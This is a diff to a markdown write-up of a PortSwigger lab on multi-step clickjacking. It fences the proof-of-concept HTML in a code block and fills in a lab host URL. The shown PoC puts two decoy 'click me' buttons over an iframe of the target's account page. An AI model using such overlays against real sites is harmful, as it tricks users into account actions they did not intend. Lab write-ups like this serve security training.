@@ -71,7 +71,7 @@ Exploit a clickjacking vulnerability requiring multiple user clicks to perform u
 
 ### **PortSwigger Lab PoC**
 
-
+```html
 <style>
     iframe {
         position: relative;
@@ -94,8 +94,8 @@ Exploit a clickjacking vulnerability requiring multiple user clicks to perform u
 
 <div class="firstClick">Click me first</div>
 <div class="secondClick">Click me next</div>
-<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
-
+<iframe src="https://0a02000004d7a00f8069cb0300bd0002.web-security-academy.net/my-account"></iframe>
+``` 
 
 ✔️ Successfully completed the Multi-Step Clickjacking Lab! 🛡️
 
